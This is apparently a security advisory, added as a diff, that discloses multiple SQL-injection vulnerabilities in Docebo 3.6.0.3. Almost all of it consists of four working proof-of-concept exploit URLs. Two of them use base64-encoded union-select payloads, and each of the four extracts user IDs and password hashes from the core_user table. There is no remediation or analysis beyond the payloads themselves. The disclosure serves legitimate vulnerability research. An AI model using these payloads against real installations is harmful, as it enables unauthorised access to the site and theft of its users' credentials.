@@ -1,0 +1,44 @@
+**************************************************************
+Application: Docebo
+Version affected: 3.6.0.3
+Website: http://www.docebo.com
+Discovered By: Andrea Fabrizi
+Email: andrea.fabrizi (at) gmail (dot) com [email concealed]
+Web: http://www.andreafabrizi.it
+Vuln: Multiple SQL-Injection Vulnerabilities
+**************************************************************
+
+########## EXAMPLE 1 ##########
+roland@hp6720s:~$ echo -n "' union select userid,pass from core_user
+-- " | base64
+JyB1bmlvbiBzZWxlY3QgdXNlcmlkLHBhc3MgZnJvbSBjb3JlX3VzZXIgLS0g
+
+-> http://localhost/docebo/doceboLms/index.php?modname=faq&op=play&mode=hel
+p&word=JyB1bmlvbiBzZWxlY3QgdXNlcmlkLHBhc3MgZnJvbSBjb3JlX3VzZXIgLS0g
+###############################
+
+########## EXAMPLE 2 ##########
+roland@hp6720s:~$ echo -n "' union select 1,userid,pass from core_user
+-- " | base64
+JyB1bmlvbiBzZWxlY3QgMSx1c2VyaWQscGFzcyBmcm9tIGNvcmVfdXNlciAtLSA=
+
+-> http://localhost/docebo/doceboLms/index.php?modname=link&op=play&mode=ke
+yw&word=JyB1bmlvbiBzZWxlY3QgMSx1c2VyaWQscGFzcyBmcm9tIGNvcmVfdXNlciAtLSA=
+
+###############################
+
+########## EXAMPLE 3 ##########
+-> http://localhost/docebo/doceboCore/index.php?modname=meta_certificate&op
+=elemmetacertificate&id_certificate=3222
+union select concat (userid,0x3d,pass),2,3 from core_user limit 1,2
+###############################
+
+########## EXAMPLE 4 ##########
+-> http://localhost/docebo/doceboCore/index.php?modname=certificate&op=elem
+certificate&id_certificate=1123
+union select concat(userid,0x3d,pass),2,3 from core_user limit 1,2
+###############################
+
+--
+Andrea Fabrizi
+http://www.andreafabrizi.it
